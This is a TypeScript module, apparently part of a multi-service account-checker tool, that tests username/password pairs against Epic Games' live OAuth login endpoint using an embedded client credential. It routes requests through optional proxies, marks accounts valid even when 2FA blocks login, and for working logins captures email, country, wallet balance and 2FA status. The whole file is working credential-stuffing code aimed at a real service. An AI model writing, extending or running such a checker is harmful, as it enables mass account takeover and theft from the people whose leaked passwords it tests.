import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class EpicGamesChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('epic', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Epic Games primarily uses email but may accept username in some cases
      this.isEmail(credential) ? this.checkAsUsername.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Epic Games OAuth login
      const loginData = new URLSearchParams({
        grant_type: 'password',
        username: credential,
        password: password,
        includePerms: 'true',
      });

      const loginResponse = await this.client.post(
        'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token',
        loginData.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=', // Epic Games client credentials
            'Accept': 'application/json',
          },
        }
      );

      if (loginResponse.data?.access_token) {
        const capture = await this.getAccountDetails(
          loginResponse.data.access_token,
          loginResponse.data.account_id
        );
        
        return this.createResult(credential, password, 'epic', 'valid', capture);
      }

      return this.createResult(credential, password, 'epic', 'invalid');
    } catch (error: any) {
      const errorCode = error.response?.data?.errorCode;
      const errorMessage = error.response?.data?.errorMessage;
      
      // Check for 2FA requirement
      if (errorCode === 'errors.com.epicgames.account.two_factor_authentication.required' ||
          errorMessage?.includes('two_factor')) {
        return this.createResult(credential, password, 'epic', 'valid', {
          twoFactorEnabled: true,
        });
      }

      // Check for account verification requirement
      if (errorCode === 'errors.com.epicgames.account.account_not_active' ||
          errorMessage?.includes('not_active')) {
        return this.createResult(credential, password, 'epic', 'valid', {
          accountNotActive: true,
        });
      }

      // Invalid credentials
      if (errorCode === 'errors.com.epicgames.common.oauth.invalid_grant' ||
          errorMessage?.includes('invalid_grant')) {
        return this.createResult(credential, password, 'epic', 'invalid');
      }

      return this.handleError(error, credential, password);
    }
  }

  private async checkAsUsername(credential: string, password: string): Promise<CheckResult> {
    // Epic Games primarily uses email, username less likely to work
    return this.createResult(credential, password, 'epic', 'invalid');
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If username failed, try as email
    return this.checkWithCredential(credential, password);
  }

  private async getAccountDetails(accessToken: string, accountId: string) {
    try {
      const response = await this.client.get(
        `https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${accountId}`,
        {
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
        }
      );

      // Get additional Epic Store data if available
      let epicBalance = 0;
      try {
        const walletResponse = await this.client.get(
          `https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${accountId}/wallet`,
          {
            headers: {
              Authorization: `Bearer ${accessToken}`,
            },
          }
        );
        epicBalance = walletResponse.data?.balance || 0;
      } catch {
        // Wallet info not available
      }

      return {
        username: response.data?.displayName,
        email: response.data?.email,
        emailVerified: response.data?.emailVerified,
        country: response.data?.country,
        createdDate: response.data?.created,
        epicBalance: epicBalance,
        accountId: accountId,
        twoFactorEnabled: response.data?.tfaEnabled,
      };
    } catch {
      return {
        accountId: accountId,
      };
    }
  }
}
